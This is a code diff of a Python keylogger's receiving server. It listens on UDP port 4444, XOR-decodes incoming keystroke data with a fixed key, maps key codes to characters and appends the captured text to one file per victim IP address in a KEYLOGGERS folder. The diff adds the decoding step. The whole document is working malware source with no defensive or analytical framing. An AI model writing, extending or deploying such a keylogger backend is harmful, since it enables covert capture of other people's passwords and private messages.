@@ -1,19 +1,35 @@
 import socket
+import keys_consts
 
 # Listen to all of the cumper's network card.
 IP_ADDRESS = "0.0.0.0"
 PORT_NUMBER = 4444
 KEYLOGGER_DIRECTORY_PATH = ".\KEYLOGGERS"
 
+ENCRYPTION_KEY = 0xFA
+
+SPECIAL_CHARS = {b"\xbe": ".", b"\xba": ';', b"\xbc": ','} 
 
 def address_to_file_name(address: str) -> str:
     return KEYLOGGER_DIRECTORY_PATH + '\\' + address.replace('.', '_')
 
 
 def add_text_to_file(text: str, address: str):
-    file_name = address_to_file_name(address)
+    file_name = address_to_file_name(address) + ".txt"
     with open(file_name, "a") as file:
         file.write(text)
+
+def data_to_text(data: bytes):
+    text = " "
+    for x in data:
+        x ^= ENCRYPTION_KEY
+        try:
+            text += keys_consts.KEYS_CONST[x]
+        except KeyError:
+            if chr(x).isprintable():
+                text += chr(x)
+    return text
+
 
 def main():
 # TODO: catch exceptions.
@@ -22,12 +38,9 @@ def main():
         server_socket.bind((IP_ADDRESS, PORT_NUMBER))
         while True:
             data, client_address = server_socket.recvfrom(1024)
-            try:
-                text = data.decode()
-                print(f"message is {text} from {client_address}")
-                add_text_to_file(text, client_address[0])
-            except UnicodeDecodeError:
-                print(f"can't print this char {data}")
+            text = data_to_text(data)
+            print(f"message is {text} from {client_address}")
+            add_text_to_file(text, client_address[0])
             
 
 
